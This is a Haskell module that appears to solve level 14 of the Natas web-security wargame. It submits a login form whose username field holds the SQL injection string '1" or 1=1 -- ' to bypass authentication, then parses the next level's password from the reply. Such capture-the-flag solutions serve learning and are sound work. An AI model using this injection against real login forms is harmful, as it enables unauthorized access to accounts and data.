{-# LANGUAGE OverloadedStrings #-}

module Natas.Natas14 where

import           Safe         (lastMay)

import           Network.Wreq (partBS)

import           Natas.Natas
import           Natas.Parse

solution :: Solution
solution = do
  let sqlInject = " 1\" or 1=1 -- "
      form = [partBS "username" sqlInject, partBS "password" "password"]
  req <- postLevel 14 form
  let body = reqBody req
      match = workupBody 15 body
  pure $ match >>= lastMay
